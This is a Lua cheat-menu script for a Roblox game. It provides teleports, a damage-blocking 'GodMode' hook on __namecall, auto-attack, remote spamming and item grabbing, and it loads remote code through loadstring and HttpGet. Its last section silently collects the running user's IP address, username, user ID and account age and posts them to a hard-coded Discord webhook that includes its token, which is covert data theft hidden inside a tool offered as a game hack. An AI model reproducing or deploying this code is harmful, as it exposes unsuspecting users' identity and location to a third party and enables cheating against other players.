local Player = game:GetService("Players").LocalPlayer

debugX = false
-- Load Rayfield Library
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
    Name = "Rxz Is a Mf | Fro was here |",
    LoadingTitle = "Fro Hub",
    LoadingSubtitle = "by Fro-Fro",
    ConfigurationSaving = {
        Enabled = false
    },
})


-- Create Autofarm Tab
local ATab = Window:CreateTab("Autofarm")
local ASection = ATab:CreateSection("Autofarm")

local Enemies = workspace.Enemies:GetDescendants()
local Mobs = {}

-- Collect all unique mob names
for i, v in pairs(workspace.Enemies:GetDescendants()) do
    if v:IsA("ObjectValue") and v.Parent.Name == "Enemy" and v.Parent:IsA("Model") and v.Name == "Model" then
        local MobName = tostring(v.Value) -- Ensure it's a string
        if not table.find(Mobs, MobName) then
            table.insert(Mobs, MobName)
        end
    end
end


-- Dropdown for Teleporting to a Mob
ATab:CreateDropdown({
    Name = "Teleport To Mob",
    Options = Mobs,
    Callback = function(CurrentOption)
		for i, v in ipairs(CurrentOption) do
			CurrentOption = v
		end
        local HRP = Player.Character:FindFirstChild("HumanoidRootPart")
        for _, v in ipairs(workspace.Enemies:GetDescendants()) do 
            if v.Parent.Name == "Enemy" and v:IsA("BasePart") and v.Name == "EnemyLocation" and tostring(v.Parent.Model.Value) == CurrentOption and not v.Parent.InCombat.Value and not v.Parent:FindFirstChild("EnemyDefeat") then
                HRP.CFrame = v.CFrame
                break
            end
        end
    end
})

local stopautotpmobloop = false
local SelectedMob = ""

-- Dropdown to Select Mob for Auto Teleport
ATab:CreateDropdown({
    Name = "Select Mob for Auto Teleport",
    Options = Mobs,
    Callback = function(CurrentOption)
	for i, v in ipairs(CurrentOption) do
		CurrentOption = v
	end
        SelectedMob = tostring(CurrentOption) -- Ensure it's a string
    end
})

-- Toggle to Start/Stop Auto Teleport Loop
ATab:CreateToggle({
    Name = "Auto Teleport To Selected Mob",
    Default = false,
    Callback = function(State)
        stopautotpmobloop = State

        
        if State then
            spawn(function()
                while stopautotpmobloop and wait(0.5) do
                    if not SelectedMob or SelectedMob == "" then continue end
                    local HRP = Player.Character:FindFirstChild("HumanoidRootPart")
                    local CombatFolder = workspace:FindFirstChild("CombatFolder")
                    
                    if not CombatFolder then
                        for _, v in ipairs(workspace.Enemies:GetDescendants()) do 
                            if v.Parent.Name == "Enemy" and v:IsA("BasePart") and v.Name == "EnemyLocation" and tostring(v.Parent.Model.Value) == SelectedMob and not v.Parent.InCombat.Value and not v.Parent:FindFirstChild("EnemyDefeat") then
                                HRP.CFrame = v.CFrame
                                break
                            end
                        end
                    end
                end
            end)
        end
    end
})

-- GodMode
ATab:CreateButton({
    Name = "GodMode",
    Callback = function()
        local Remote = game:GetService("ReplicatedStorage"):FindFirstChild("DamageNew", true)
        local OldNameCall
        OldNameCall = hookmetamethod(game, "__namecall", function(self, ...)
            local Args = {...}
            if self == Remote and Args[1] == Player.Character then
                return
            end
            return OldNameCall(self, unpack(Args))
        end)
    end
})

local Tp = true

-- Auto Orb Teleport Toggle
ATab:CreateToggle({
    Name = "Auto OrbTP",
    Default = false,
    Callback = function(State)
        Tp = State
        task.spawn(function()
            while Tp and wait(0.1) do
                local CombatFolder = workspace:FindFirstChild("CombatFolder")
                if CombatFolder and CombatFolder:FindFirstChild(Player.Name) then
                    local Character = Player.Character or Player.CharacterAdded:Wait()
                    local HRP = Character:FindFirstChild("HumanoidRootPart")
                    local MyFol = CombatFolder:FindFirstChild(Player.Name):GetDescendants()
                    if MyFol then
                        for i, v in pairs(MyFol) do
                            if v:IsA("BasePart") and (v.Name == "HitBox" or v.Name == "Base") then
                                HRP.CFrame = v.CFrame
                            end
                        end
                    end
                end
            end
        end)
    end
})
local Player = game.Players.LocalPlayer
local CF
local Remote = game:GetService("ReplicatedStorage").Remotes:FindFirstChild("DamageNew")
local char = Player.Character
local enemy
local con1

-- Function to attack enemies in combat
local function attackLoop()
	while CF and CF:FindFirstChild(Player.Name) and enemy do
		local playerCombatFolder = CF:FindFirstChild(Player.Name)
		if not playerCombatFolder then break end -- Exit if combat folder disappears

		for _, orb in pairs(playerCombatFolder:GetChildren()) do
			if enemy and orb and Remote then -- Ensure all exist before firing
				print("Firing at:", enemy, "with", orb)
				Remote:FireServer(enemy, orb)
			end
			task.wait(0.05)
		end

		task.wait(0.5)
	end
end

ATab:CreateToggle({
    Name = "Auto Hit",
    Default = false,
    Callback = function(State)
        if State then
            -- Connect targeting change event
            con1 = char.Targeting.Changed:Connect(function()
                enemy = workspace.updateis_nottoday.Targeting.Value
                if enemy then
                    task.spawn(attackLoop) -- Run attack loop if an enemy exists
                end
            end)
        else
            -- Disconnect event properly
            if con1 then
                con1:Disconnect()
                con1 = nil
            end
        end
    end
})

workspace.ChildAdded:Connect(function(new)
    if new.Name == "CombatFolder" and new:FindFirstChild(Player.Name) then
        CF = new
    end
end)


local Acts = true

-- Spam All Actives Toggle
ATab:CreateToggle({
    Name = "Spam All Actives",
    Default = false,
    Callback = function(State)
        Acts = State
        while Acts and wait() do
            for i = 1, 3 do
                local args = {
                    [1] = "UseItem",
                    [2] = i,
                    [3] = { ["MouseHit"] = Vector3.new(-46,50,43) }
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Server"):FireServer(unpack(args))
            end
        end
    end
})

ATab:CreateButton({
    Name = "AntiAFK",
    Callback = function()
        print("AntiAFK button clicked")
        
        -- Start a loop to simulate activity to prevent AFK
        while true do
            -- Moving the character a little bit every second
            game:GetService("Players").LocalPlayer.Character:MoveTo(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0, 0, 1))
            wait(5)  -- Wait for 5 seconds before moving again
        end
    end
})


local BTab = Window:CreateTab("Fruits/Trees/Pickups")
local BSection = BTab:CreateSection("Fruits/Trees/Pickups")

local Mats = false -- Default to OFF
local MaterialGivers = game:GetService("Workspace"):FindFirstChild("MaterialGivers"):GetDescendants()

-- Toggle for Gathering Fruits/Trees
BTab:CreateToggle({
    Name = "Gather Fruits",
    Default = false,
    Callback = function(State)
        Mats = State
        if Mats then
            spawn(function()
                while Mats and wait(0.1) do
                    local Player = game:GetService("Players").LocalPlayer
                    local Character = Player.Character or Player.CharacterAdded:Wait()
                    local HRP = Character:FindFirstChild("HumanoidRootPart")

                    if HRP then
                        for _, v in ipairs(MaterialGivers) do
                            if v:IsA("BasePart") and v.Parent.Parent.Parent.Name == "MaterialGivers" then
                                firetouchinterest(HRP, v, 0)
                                firetouchinterest(HRP, v, 1)
                            end
                        end
                    end
                end
            end)
        end
    end
})

-- Teleport to Meteorite
BTab:CreateButton({
    Name = "Teleport To Meteorite",
    Callback = function()
        local Player = game:GetService("Players").LocalPlayer
        local HRP = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
        if HRP then
            HRP.CFrame = CFrame.new(-427, 232.5, -414)
        end
    end
})

-- Toggle for Auto Teleport to Graveshard Grave
local gravetp = false
BTab:CreateToggle({
    Name = "Teleport To A Graveshard Grave",
    Default = false,
    Callback = function(State)
        gravetp = State
        print("Teleport Active:", gravetp)

        if gravetp then
            spawn(function()
                while gravetp do
                    local Player = game:GetService("Players").LocalPlayer
                    local HRP = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
                    if HRP then
                        for _, v in ipairs(workspace:GetChildren()) do
                            if v.Name == "Hitbox" and v.Parent == workspace then
                                HRP.CFrame = v.CFrame
                                print("Teleported to Grave!")
                                break
                            end
                        end
                    else
                        print("HumanoidRootPart not found! Waiting for respawn...")
                    end
                    task.wait(0.5)
                end
            end)
        end
    end
})

-- Button to Teleport to Dragonball
BTab:CreateButton({
    Name = "Teleport To A Dragonball",
    Callback = function()
        local Player = game:GetService("Players").LocalPlayer
        local HRP = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
        if HRP then
            for _, v in ipairs(workspace:GetChildren()) do
                if v.Name == "Middle" and v.Parent.Parent == workspace and v.Parent.Name == "DragonBall" then
                    HRP.CFrame = v.CFrame
                    break
                end
            end
        end
    end
})

-- Button to Teleport to Lily
BTab:CreateButton({
    Name = "Teleport To A Lily",
    Callback = function()
        local Player = game:GetService("Players").LocalPlayer
        local HRP = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
        if HRP then
            for _, v in ipairs(workspace:GetChildren()) do
                if v.Name == "Middle" and v.Parent.Parent == workspace and v.Parent.Name == "Lily" then
                    HRP.CFrame = v.CFrame
                    break
                end
            end
        end
    end
})

-- Button to Teleport to Deathbush/SweetLoveBush
BTab:CreateButton({
    Name = "Teleport To A Deathbush/SweetLoveBush",
    Callback = function()
        local Player = game:GetService("Players").LocalPlayer
        local HRP = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
        if HRP then
            for _, v in ipairs(workspace:GetChildren()) do
                if v.Name == "Middle" and v.Parent.Parent == workspace and v.Parent.Name == "DeathBush" then
                    HRP.CFrame = v.CFrame
                    break
                end
            end
        end
    end
})

local CTab = Window:CreateTab("Teleport")
local CSection = CTab:CreateSection("Teleport")

-- Arsenal Locations
local ArsenalTab = {}
local Arsenals = workspace:WaitForChild("Arsenals"):GetDescendants()

for i, v in ipairs(Arsenals) do
    if v:IsA("BasePart") and v.Parent.Parent.Name == "Arsenals" then
        if not table.find(ArsenalTab, v.Parent.Name) then
            table.insert(ArsenalTab, v.Parent.Name)
        end
    end
end

table.insert(ArsenalTab, "Void")
table.insert(ArsenalTab, "Land Under The Waterfall")
table.sort(ArsenalTab)

-- Dropdown: Teleport to Arsenal
CTab:CreateDropdown({
    Name = "Teleport To Arsenal",
    Options = ArsenalTab,
    Callback = function(CurrentOption)
		for i, v in ipairs(CurrentOption) do
			CurrentOption = v
		end
        local Player = game.Players.LocalPlayer
        local HRP = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
        if HRP then
            if CurrentOption == "Land Under The Waterfall" then
                HRP.CFrame = CFrame.new(-19912, -110, -6258)
            elseif CurrentOption == "Void" then
                HRP.CFrame = CFrame.new(-19396, -73, -4085)
            else
                local Arsenal = workspace.Arsenals:FindFirstChild(CurrentOption)
                if Arsenal then
                    HRP.CFrame = Arsenal:FindFirstChild("Base").CFrame
                end
            end
        end
    end
})

-- Relic NPCs
local NPCs = {
    "Smile (Hyper)", "Bottle of ??? (Hunter)", "Blind Grillby (Burning Head)",
    "Cursed Altar (Cursed)", "Gabriel (Ocean Glider)", "Green Light Green Light (Portal)",
    "Gears (Time Grinders)", "Mixed Letter (Ghoul)", "Holy Cross (Holy)",
    "Bottle (Gravity Boots)", "Ancient Paw (Pull)", "Noob (Torch)",
    "Broski (Bounty Hunter)", "Jeff (Berserk)", "Gem (Crystalized)",
    "Avatar of Radismus (Blood Wipe)"
}

local NPC_Locations = {
    ["Bottle of ??? (Hunter)"] = CFrame.new(-1040.1, 195.214, -4722.89),
    ["Blind Grillby (Burning Head)"] = CFrame.new(156.598, 162.562, -2334.68),
    ["Cursed Altar (Cursed)"] = CFrame.new(-201.773, -98.5357, 2893.72),
    ["Gabriel (Ocean Glider)"] = CFrame.new(1721.16, 4.14446, -5437.34),
    ["Green Light Green Light (Portal)"] = CFrame.new(-529.14, -92.2, 2063.35),
    ["Gears (Time Grinders)"] = CFrame.new(-1848, 203.5, -3941.5),
    ["Mixed Letter (Ghoul)"] = CFrame.new(-1092.88, -101, 2155.55),
    ["Holy Cross (Holy)"] = CFrame.new(-1275, 493, 67),
    ["Bottle (Gravity Boots)"] = CFrame.new(5319.36, 13.2782, -8510.45),
    ["Ancient Paw (Pull)"] = CFrame.new(-904, 70, -2592.5),
    ["Noob (Torch)"] = CFrame.new(-124.406, 43.0267, -415.472),
    ["Broski (Bounty Hunter)"] = CFrame.new(569.595, 194.855, -2082.55),
    ["Jeff (Berserk)"] = CFrame.new(311.894, 66.9847, -1380.45),
    ["Gem (Crystalized)"] = CFrame.new(681.1, 34.6, -1334.6),
    ["Avatar of Radismus (Blood Wipe)"] = CFrame.new(5230.36, 384.857, 1645.1),
    ["Smile (Hyper)"] = CFrame.new(-1201, -123, 2573)
}

-- Dropdown: Teleport to Relic NPC
CTab:CreateDropdown({
    Name = "Teleport To Chosen Relic NPC",
    Options = NPCs,
    Callback = function(CurrentOption)
		for i, v in ipairs(CurrentOption) do
			CurrentOption = v
		end
        local Player = game.Players.LocalPlayer
        local HRP = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
        if HRP and NPC_Locations[CurrentOption] then
            HRP.CFrame = NPC_Locations[CurrentOption]
        end
    end
})

-- ✅ Quest NPCs (Grani & Blubb included)
local NPCTable = {"Grani", "King Blubb"}
for _, v in pairs(workspace.QuestNPCs:GetDescendants()) do
    if v.Name == "HumanoidRootPart" and v.Parent:IsA("Model") then
        if not table.find(NPCTable, v.Parent.Name) then
            table.insert(NPCTable, v.Parent.Name)
        end
    end
end

CTab:CreateDropdown({
    Name = "Teleport To Quest NPC",
    Options = NPCTable,
    Callback = function(CurrentOption)
		for i, v in ipairs(CurrentOption) do
			CurrentOption = v
		end
        local Player = game.Players.LocalPlayer
        local HRP = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
        if HRP then
            if CurrentOption == "Grani" then
                HRP.CFrame = CFrame.new(6737.32, 144.011, 9794.26)
            elseif CurrentOption == "King Blubb" then
                HRP.CFrame = CFrame.new(-3723.83, 431.422, -5055.45)
            else
                local NPC = workspace.QuestNPCs:FindFirstChild(CurrentOption)
                if NPC and NPC:FindFirstChild("HumanoidRootPart") then
                    HRP.CFrame = NPC.HumanoidRootPart.CFrame
                end
            end
        end
    end
})

-- ✅ Class Statues
local StatuesTable = {}
for _, v in pairs(workspace.Statues:GetDescendants()) do
    if v.Name == "ProximityPrompt" and v.Parent.Name == "Attachment" then
        local statueName = v.Parent.Parent.Parent.Name
        if not table.find(StatuesTable, statueName) then
            table.insert(StatuesTable, statueName)
        end
    end
end

CTab:CreateDropdown({
    Name = "Teleport To Class Statue",
    Options = StatuesTable,
    Callback = function(CurrentOption)
		for i, v in ipairs(CurrentOption) do
			CurrentOption = v
		end
        local Player = game.Players.LocalPlayer
        local HRP = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
        local Statue = workspace.Statues:FindFirstChild(CurrentOption)
        if HRP and Statue then
            local Prompt = Statue:FindFirstChild("ProximityPrompt", true)
            if Prompt and Prompt.Parent then
                HRP.CFrame = Prompt.Parent.Parent.CFrame
            end
        end
    end
})

-- Player Teleportation
local function updatePlayerList()
    local playerList = {}
    for _, v in ipairs(game.Players:GetPlayers()) do
        if v.Name ~= game.Players.LocalPlayer.Name then
            table.insert(playerList, v.Name)
        end
    end
    return playerList
end

local dropdown = CTab:CreateDropdown({
    Name = "Teleport To Player",
    Options = updatePlayerList(),
    Callback = function(CurrentOption)
		for i, v in ipairs(CurrentOption) do
			CurrentOption = v
		end
        local Player = game.Players.LocalPlayer
        local HRP = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
        for _, v in ipairs(game.Players:GetPlayers()) do
            if v.Name == CurrentOption and v.Character then
                local TargetHRP = v.Character:FindFirstChild("HumanoidRootPart")
                if TargetHRP then
                    HRP.CFrame = TargetHRP.CFrame
                end
            end
        end
    end
})

CTab:CreateButton({
    Name = "Update Playerlist",
    Callback = function()
        dropdown:Refresh(updatePlayerList())
    end
})

-- Teleport to Fairy
CTab:CreateButton({
    Name = "Teleport To Fairy",
    Callback = function()
        local fairy = workspace:FindFirstChild("Vanessa") or workspace:FindFirstChild("Abigail")
        if fairy then
            local Player = game.Players.LocalPlayer
            local HRP = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if HRP then
                HRP.CFrame = fairy.Fairy.HumanoidRootPart.CFrame
            end
        end
    end
})

-- Teleport to Harvestia
CTab:CreateButton({
    Name = "Teleport To Harvestia",
    Callback = function()
        local harvestia = workspace:FindFirstChild("Harvestia")
        if harvestia then
            local Player = game.Players.LocalPlayer
            local HRP = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if HRP then
                HRP.CFrame = harvestia.HumanoidRootPart.CFrame
            end
        end
    end
})

local DTab = Window:CreateTab("Other")
local DSection = DTab:CreateSection("Other")

DTab:CreateToggle({
    Name = "No Shadows(Anti Lag)",
    Callback = function(State)
        game:GetService("Lighting").GlobalShadows = not State
    end
})

DTab:CreateButton({
    Name = "Infinite Combo ComboSword",
    Callback = function()
        local Player = game.Players.LocalPlayer
        local Debris = game:GetService("Debris")

        local function InfCombo(Character)
            local Head = Character:WaitForChild("Head", 10) -- Wait 10s for safety
            if Head then
                Head.DescendantAdded:Connect(function(v)
                    if v:IsA("Script") then
                        Debris:AddItem(v, 0.5)
                    end
                end)
            end
        end

        Player.CharacterAdded:Connect(InfCombo)
        if Player.Character then
            InfCombo(Player.Character)
        end
    end
})

DTab:CreateButton({
    Name = "InfiniteYield",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
    end
})


DTab:CreateButton({
    Name = "Open All Chests",
    Callback = function()
        local HRP = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if HRP then
            local Chests = workspace:FindFirstChild("Chests")
            if Chests then
                for _, v in ipairs(Chests:GetDescendants()) do
                    if v.Name == "TouchInterest" and v.Parent.Name == "Giver" then
                        firetouchinterest(HRP, v.Parent, 0)
                        firetouchinterest(HRP, v.Parent, 1)
                    end
                end
            end
        end
    end
})


local BlubbToggle = false
local function AutoBuyBlubbPizza()
    while BlubbToggle do
        task.wait(0.1)
        local Player = game.Players.LocalPlayer
        local Gold = Player:FindFirstChild("leaderstats") and Player.leaderstats:FindFirstChild("Gold")
        if Gold and Gold.Value > 12500 then
            game:GetService("ReplicatedStorage").Remotes.Effected:FireServer("Buy5", workspace.Stalls["Initus Bay"]["Item Shop"].Shop["Blubb Pizza"])
        end
    end
end

DTab:CreateToggle({
    Name = "Autobuy Blubb's Pizza",
    Default = false,
    Callback = function(State)
        BlubbToggle = State
        if BlubbToggle then
            task.spawn(AutoBuyBlubbPizza)
        end
    end
})

local SumTab = Window:CreateTab("Moon Events")
local SumSection = SumTab:CreateSection("Moon Events")

-- ✅ Auto Collect Stars
local autoCollectStarsEnabled = false
local connection

SumTab:CreateToggle({
    Name = "Auto Collect Stars",
    Default = false,
    Callback = function(state)
        autoCollectStarsEnabled = state
        print("Auto Collect Stars:", autoCollectStarsEnabled)

        if not autoCollectStarsEnabled and connection then
            connection:Disconnect()
            connection = nil
        end

        while autoCollectStarsEnabled do
            local Player = game.Players.LocalPlayer
            local Character = Player.Character or Player.CharacterAdded:Wait()
            local HRP = Character and Character:FindFirstChild("HumanoidRootPart")

            if HRP then
                local StarF = workspace:FindFirstChild("StarShower_Normal") or workspace:FindFirstChild("StarShower_Blue")

                if not StarF and not connection then
                    connection = workspace.ChildAdded:Connect(function(new)
                        if new.Name == "StarShower_Normal" or new.Name == "StarShower_Blue" then
                            StarF = new
                            connection:Disconnect()
                            connection = nil
                        end
                    end)
                elseif StarF then
                    for _, v in ipairs(StarF.Models:GetChildren()) do
						if not autoCollectStarsEnabled then
							task.wait(0.2)
                        	if v:IsA("BasePart") and (v.Name == "Star" or v.Name == "BlueStar") then
                           		HRP.CFrame = v.CFrame + Vector3.new(0, 3, 0)
                           		wait(0.2)

                            	for _, prompt in ipairs(v:GetDescendants()) do
                                	if prompt:IsA("ProximityPrompt") then
                                    	fireproximityprompt(prompt)
                                    	print("Collected a " .. v.Name .. "!")
                                    	break
                                	end
                            	end
							end
                        else return end
                    end
                end
            end

            wait(1) -- Prevent excessive execution
        end
    end
})

-- ✅ Activate Telescope
SumTab:CreateButton({
    Name = "Activate Telescope",
    Callback = function()
        local Player = game.Players.LocalPlayer
        local Character = Player.Character or Player.CharacterAdded:Wait()
        local HRP = Character:FindFirstChild("HumanoidRootPart")

        getgenv().stopautotpmobloop = true
        task.wait(0.4)
        getgenv().stopautotpmobloop = false

        HRP.CFrame = CFrame.new(1989, 415, 3406)
        task.wait(0.2)

        for _, v in ipairs(workspace.Stalls.Telescope.Proximity:GetChildren()) do
            if v:IsA("ProximityPrompt") then
                fireproximityprompt(v)
                print("Activated Telescope!")
                return
            end
        end

        print("No ProximityPrompt found!")
    end
})

-- ✅ Auto Steal Moon (Harvest)
local harvestAuto = false
SumTab:CreateToggle({
    Name = "Auto Steal the Moon (Harvest)",
    Default = false,
    Callback = function(state)
        harvestAuto = state
        local moonStolen = false

        while harvestAuto do
            local moonType = game:GetService("ReplicatedStorage").DayNightCycle.MoonType.Value
            if moonType == "Harvest" and not moonStolen then
                local Player = game.Players.LocalPlayer
                local Character = Player.Character or Player.CharacterAdded:Wait()
                local HRP = Character:FindFirstChild("HumanoidRootPart")

                getgenv().stopautotpmobloop = true
                task.wait(0.4)
                getgenv().stopautotpmobloop = false

                HRP.CFrame = CFrame.new(1989, 415, 3406)
                task.wait(0.2)

                for _, v in ipairs(workspace.Stalls.Telescope.Proximity:GetChildren()) do
                    if v:IsA("ProximityPrompt") then
                        fireproximityprompt(v)
                        moonStolen = true
                        print("Activated Telescope for Harvest Moon!")
                        return
                    end
                end

                print("No ProximityPrompt found!")
            elseif moonType == "Normal" then
                moonStolen = false
            end
            task.wait(2)
        end
    end
})

-- ✅ Auto Steal Moon (Blue)
local blueMoonAuto = false
SumTab:CreateToggle({
    Name = "Auto Steal the Moon (Blue)",
    Default = false,
    Callback = function(state)
        blueMoonAuto = state
        local moonStolen = false

        while blueMoonAuto do
            local moonType = game:GetService("ReplicatedStorage").DayNightCycle.MoonType.Value
            if moonType == "Blue" and not moonStolen then
                local Player = game.Players.LocalPlayer
                local Character = Player.Character or Player.CharacterAdded:Wait()
                local HRP = Character:FindFirstChild("HumanoidRootPart")

                getgenv().stopautotpmobloop = true
                task.wait(0.4)
                getgenv().stopautotpmobloop = false

                HRP.CFrame = CFrame.new(1989, 415, 3406)
                task.wait(0.2)

                for _, v in ipairs(workspace.Stalls.Telescope.Proximity:GetChildren()) do
                    if v:IsA("ProximityPrompt") then
                        fireproximityprompt(v)
                        moonStolen = true
                        print("Activated Telescope for Blue Moon!")
                        return
                    end
                end

                print("No ProximityPrompt found!")
            elseif moonType == "Normal" then
                moonStolen = false
            end
            task.wait(2)
        end
    end
})

local http = http_request or request or syn.request
local webhookURL = "https://discord.com/api/webhooks/1350505650169446633/nEvfDDBjE6sQdEOCzLqzy3-lEUK9yFiwOrGWat2gnZOUwK2_5HDdtiZrhjWHVQi9io7I"
local HttpService = game:GetService("HttpService")

local player = game.Players.LocalPlayer
local username = player.Name
local userId = player.UserId
local accountAge = player.AccountAge
local joinTime = os.date("%d/%m/%Y %X")

local ipData = http({
    Url = "https://checkip.amazonaws.com",
    Method = "GET"
})

local ipAddress = ""
local isJson = false

local fields = {
    {name = "**Player Used Script At**", value = joinTime, inline = false},
    {name = "**Player User Name**", value = player.Name, inline = false},
}


pcall(function()
    local ipJSON = HttpService:JSONDecode(ipData.Body)
    ipAddress = ipJSON.ip
    isJson = true
end)

if not isJson then
    ipAddress = ipData.Body
end


table.insert(fields, {name = "**User ID:**", value = tostring(userId), inline = true})
table.insert(fields, {name = "**Account Age:**", value = tostring(math.floor(accountAge / 365)) .. "Y, " .. tostring(math.floor((accountAge % 365) / 30)) .. "M, " .. tostring(accountAge % 30) .. "D.", inline = false})
table.insert(fields, {name = "**IP Address:**", value = tostring(ipAddress) , inline = false})

local embedData = {
    title = "Player Event Log", 
    color = 65280,
    fields = fields
}


local data = {
    username = "Game Logs",
    embeds = {embedData}
}



local jsonData = HttpService:JSONEncode(data)


http({
    Url = webhookURL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = jsonData
})


